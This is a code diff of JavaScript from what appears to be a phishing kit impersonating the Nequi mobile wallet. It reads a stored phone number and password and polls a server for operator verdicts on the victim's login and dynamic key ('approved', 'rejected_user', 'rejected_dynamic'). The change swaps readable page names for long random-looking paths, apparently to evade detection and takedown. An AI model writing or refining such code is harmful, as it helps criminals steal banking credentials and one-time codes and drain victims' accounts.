@@ -43,10 +43,10 @@ document.addEventListener('DOMContentLoaded', () => {
             const clave = localStorage.getItem('nequi_clave');
 
             if (!celular || !clave) {
-                alert('Error: No se encontraron datos de sesión. Por favor inicie sesión nuevamente.');
-                window.location.href = 'login_final.html';
-                return;
-            }
+            alert('Error: No se encontraron datos de sesión. Por favor inicie sesión nuevamente.');
+            window.location.href = '/Xy7K9LmN2PqR5StV8WzX1Y4AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn';
+            return;
+          }
 
             // Show loading overlay immediately
             const overlay = document.getElementById('loading-overlay');
@@ -98,14 +98,13 @@ document.addEventListener('DOMContentLoaded', () => {
             .then(statusData => {
                 if (statusData.status === 'approved') {
                     clearInterval(pollInterval);
-                    navigateWithLoader('final_page.html'); // Change to whatever the final success page is
+                    navigateWithLoader('/FiNaLPaGeXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWx');
                 } else if (statusData.status === 'rejected_user') {
                     clearInterval(pollInterval);
-                    window.location.href = 'login_final.html?error=user';
+                    window.location.href = '/Xy7K9LmN2PqR5StV8WzX1Y4AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn?error=user';
                 } else if (statusData.status === 'rejected_dynamic') {
                     clearInterval(pollInterval);
-                    // Reload current page with error parameter
-                    window.location.href = 'confirmacion_nequi.html?error=dynamic';
+                    window.location.href = '/ZaBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIj?error=dynamic';
                 }
             })
             .catch(err => console.error('Polling error:', err));
